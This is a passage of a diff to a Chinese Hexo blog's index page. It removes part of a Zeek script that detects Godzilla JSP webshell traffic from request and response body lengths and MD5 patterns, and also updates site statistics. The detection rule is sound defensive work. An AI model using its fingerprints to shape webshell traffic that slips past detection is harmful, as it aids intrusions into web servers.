result: SumStats::Result) =</span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( result[<span class="string">&quot;godzilla_jsp_aes_base64_webshell_event&quot;</span>]$unique == <span class="number">3</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          local sig1: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local sig2: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local sig3: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local pass_str_set: <span class="built_in">set</span>[<span class="built_in">string</span>];</span><br><span class="line">                          local md5_str_set: <span class="built_in">set</span>[<span class="built_in">string</span>];</span><br><span class="line">                          local key_str_vector: <span class="built_in">vector</span> of <span class="built_in">string</span> = split_string(key$str, /#####/);</span><br><span class="line"></span><br><span class="line">                          <span class="keyword">for</span> ( value in result[<span class="string">&quot;godzilla_jsp_aes_base64_webshell_event&quot;</span>]$unique_vals )</span><br><span class="line">                          &#123;</span><br><span class="line">                            local observe_str_vector: <span class="built_in">vector</span> of <span class="built_in">string</span> = split_string(value$str, /#####/);</span><br><span class="line">                            local client_body = unescape_URI(observe_str_vector[<span class="number">1</span>]);</span><br><span class="line">                            local server_body = unescape_URI(observe_str_vector[<span class="number">2</span>]);</span><br><span class="line">                            local client_body_len = to_int(observe_str_vector[<span class="number">3</span>]);</span><br><span class="line">                            local offset = <span class="built_in">strstr</span>(client_body, <span class="string">&quot;=&quot;</span>);</span><br><span class="line">                            local client_body_value = client_body[offset: |client_body|];</span><br><span class="line"></span><br><span class="line">                            ## 获取 WebShell Password Key</span><br><span class="line">                            <span class="keyword">if</span> (offset &gt; <span class="number">1</span>)</span><br><span class="line">                              add pass_str_set[client_body[<span class="number">0</span>: offset<span class="number">-1</span>]];</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (|server_body| &gt; <span class="number">0</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                              local server_body_str = server_body[<span class="number">0</span>: <span class="number">16</span>] + server_body[<span class="number">-16</span>: ];</span><br><span class="line">                              local server_body_md5 = find_last(server_body_str, /[a-zA-Z0<span class="number">-9</span>]&#123;<span class="number">32</span>&#125;/);</span><br><span class="line">                              add md5_str_set[server_body_md5];</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            ## 请求体长度 &gt; <span class="number">48500</span> &amp;&amp; 响应体长度 = <span class="number">0</span></span><br><span class="line">                            <span class="keyword">if</span> ( (client_body_len &gt; <span class="number">48500</span>) &amp;&amp; (|server_body| == <span class="number">0</span>) )</span><br><span class="line">                              sig1 = T;</span><br><span class="line"></span><br><span class="line">                            ## 请求体长度 = <span class="number">64</span> &amp;&amp; 响应体长度 = <span class="number">76</span></span><br><span class="line">                            <span class="keyword">if</span> ( (|client_body_value| == <span class="number">64</span>) &amp;&amp; (|server_body| == <span class="number">76</span>) &amp;&amp; (server_body_str == server_body_md5) )</span><br><span class="line">                              sig2 = T;</span><br><span class="line"></span><br><span class="line">                            ## 请求体长度 = <span class="number">88</span></span><br><span class="line">                            <span class="keyword">if</span> ( |client_body_value| == <span class="number">88</span> &amp;&amp; (server_body_str == server_body_md5) )</span><br><span class="line">                              sig3 = T;</span><br><span class="line">                          &#125;</span><br><span class="line"></span><br><span class="line">                          ## 判断<span class="number">3</span>次请求体中Password Key 是否唯一、判断<span class="number">2</span>、<span class="number">3</span>次的响应体中的是否MD5是否唯一</span><br><span class="line">                          <span class="keyword">if</span> ( (|pass_str_set| == <span class="number">1</span>) &amp;&amp; (|md5_str_set| == <span class="number">1</span>) )</span><br><span class="line">                            <span class="keyword">if</span> ( sig1 &amp;&amp; sig2 &amp;&amp; sig3 )</span><br><span class="line">                            &#123;</span><br><span class="line">                              NOTICE([</span><br><span class="line">                                $note=WebShell_Godzilla_JSP_AES_BASE64,</span><br><span class="line">                                $uid=key_str_vector[<span class="number">0</span>],</span><br><span class="line">                                $src=to_addr(key_str_vector[<span class="number">1</span>]),</span><br><span class="line">                                $dst=to_addr(key_str_vector[<span class="number">3</span>]),</span><br><span class="line">                                $msg=fmt(<span class="string">&quot;[+] Godzilla(JSP_AES_BASE64) traffic Detected, %s:%s -&gt; %s:%s, WebShell URI: %s&quot;</span>, key_str_vector[<span class="number">1</span>], key_str_vector[<span class="number">2</span>], key_str_vector[<span class="number">3</span>], key_str_vector[<span class="number">4</span>], key_str_vector[<span class="number">5</span>]),</span><br><span class="line">                                $sub=cat(<span class="string">&quot;Godzilla traffic Detected&quot;</span>)</span><br><span class="line">                              ]);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">  ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="模型验证"><a href="#模型验证" class="headerlink" title="模型验证"></a>模型验证</h1><p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Godzilla-v4_Detected.gif" alt="Godzilla v4 Detected"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
     <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
@@ -2143,13 +2039,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">220k</span>
+    <span title="站点总字数">225k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:20</span>
+    <span title="站点阅读时长">3:25</span>
   </span>
 </div>
 
